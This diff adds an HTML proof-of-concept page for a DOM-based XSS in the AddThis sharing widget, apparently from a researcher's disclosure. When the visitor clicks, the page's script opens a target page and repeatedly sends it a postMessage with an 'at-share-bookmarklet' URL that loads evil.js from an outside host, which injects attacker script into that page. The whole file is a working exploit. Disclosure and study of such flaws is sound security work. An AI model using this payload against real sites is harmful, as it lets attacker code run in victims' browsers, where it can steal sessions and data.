@@ -1,0 +1,17 @@
+<html>
+  <body>
+    <div style="font-size: 30px; color: #a54848;">Click anywhere :)</div><br>
+    <script>
+    window.onload = function() {
+      window.document.body.onclick = xss_target;
+    }
+
+    function xss_target() {
+      w = window.open("http://zhchbin.github.io/2016/12/25/DOM-XSS-Caused-by-AddThis/");
+      setInterval(function() {
+        w.postMessage('at-share-bookmarklet://cdn.rawgit.com/zhchbin/zhchbin.github.io/source/js/evil.js', '*');
+      }, 3000);
+    }
+    </script>
+  </body>
+</html>
